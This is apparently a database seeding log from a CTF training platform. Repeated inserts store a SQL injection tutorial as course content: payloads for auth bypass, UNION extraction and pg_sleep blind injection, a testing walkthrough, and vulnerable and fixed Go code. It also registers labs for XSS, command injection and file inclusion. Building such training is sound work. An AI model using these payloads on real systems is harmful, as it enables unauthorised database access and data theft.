db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,98) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.475ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.824ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.594','2025-06-09 14:07:55.594',NULL,'cyber security and kcqjh','LnRCxnCNqQwMXucbHrodDFaeHfYkVaSFbeEIxcvNwjtHcbvCdVgYeyuOpJAXbVikrORxlFQZnkzKXttbAzhGGEykklhgonuibFJz',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.515ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.412ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 99 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.675ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.602','2025-06-09 14:07:55.602',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,99) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.454ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[12.044ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.609','2025-06-09 14:07:55.609',NULL,'cyber security and rzwiz','QAzyKstqLblOhoyGtgfYtIqKWeFwJueJAcJbTSOeYObJoIbJzIUotEkuBPNyBvAfvDPQDlrBzSKRkAAQMBFCjYfYGAkKjsTsWrXY',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.503ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 100 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.494ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.625','2025-06-09 14:07:55.625',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,100) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.470ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.147ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.632','2025-06-09 14:07:55.632',NULL,'sqli fundamentals','Learn and exploit basic SQL Injection vulnerabilities in a simulated environment.',150,5) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.093ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.566ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.490ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 101 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[13.101ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.64','2025-06-09 14:07:55.64',NULL,'mintesnotafework/sql_injection-image:v1.0',1,101,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.495ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 1 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.164ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.651','2025-06-09 14:07:55.651',NULL,'xss playground','Explore Cross-Site Scripting (XSS) attacks and how to prevent them.',120,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.534ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.442ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.451ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 102 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[9.030ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.659','2025-06-09 14:07:55.659',NULL,'mintesnotafework/xss_playground-image:v1.0',1,102,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.376ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.777ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.67','2025-06-09 14:07:55.67',NULL,'command injection 101','Understand command injection vulnerabilities through hands-on exploitation.',180,3) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.822ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.596ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.466ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 103 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[11.315ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.678','2025-06-09 14:07:55.678',NULL,'mintesnotafework/command-injection-image:v1.0',1,103,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.488ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.431ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.688','2025-06-09 14:07:55.688',NULL,'broken auth basics','Learn to identify and exploit broken authentication mechanisms.',170,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.606ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.467ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.480ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 104 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[7.971ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.698','2025-06-09 14:07:55.698',NULL,'mintesnotafework/broken-auth-image:v1.0',1,104,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.466ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.571ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.704','2025-06-09 14:07:55.704',NULL,'file inclusion lab','Experiment with Local and Remote File Inclusion vulnerabilities.',190,3) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.557ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.473ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.530ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 105 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[7.749ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.713','2025-06-09 14:07:55.713',NULL,'mintesnotafework/file-inclusion-image:v1.0',1,105,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.529ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[12.938ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.72','2025-06-09 14:07:55.72',NULL,'sensitive data exposure','Practice identifying sensitive data leaks in web applications.',140,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.130ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.483ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.437ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 106 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

